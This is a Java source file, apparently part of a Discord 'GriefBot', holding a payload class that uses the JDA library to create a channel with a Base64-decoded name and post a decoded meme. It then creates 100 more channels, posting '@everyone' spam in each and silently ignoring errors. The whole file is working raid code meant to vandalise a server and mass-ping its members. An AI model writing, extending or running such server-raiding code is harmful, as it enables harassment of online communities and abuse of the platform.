package de.corruptedbytes.payload.impl;

import java.nio.charset.StandardCharsets;
import java.util.Base64;

import de.corruptedbytes.GriefBot;
import de.corruptedbytes.utils.Shelv;
import net.dv8tion.jda.api.entities.Guild;
import net.dv8tion.jda.api.entities.TextChannel;

public class PayloadSpam implements Runnable {

	private Guild guild;
	private String name;
	
	public PayloadSpam(Guild guild, String name) {
		this.guild = guild;
		this.name = name;
	}
	
	@Override
	public void run() {
		TextChannel base = guild
				.createTextChannel(new String(Base64.getDecoder().decode(Shelv.ASCII_EMOJI), StandardCharsets.UTF_8))
				.complete();
		base.sendMessage(new String(Base64.getDecoder().decode(Shelv.ASCII_MEME), StandardCharsets.UTF_8)).queue();

		for (int i = 0; i < 100; i++) {
			try {
				TextChannel grief = guild.createTextChannel(name.toLowerCase()).complete();
				grief.sendMessage("@everyone\r\n" + GriefBot.getInstance().getSpamMessage()).queue();
			} catch (Exception ignored) {
			}
		}
	}

}
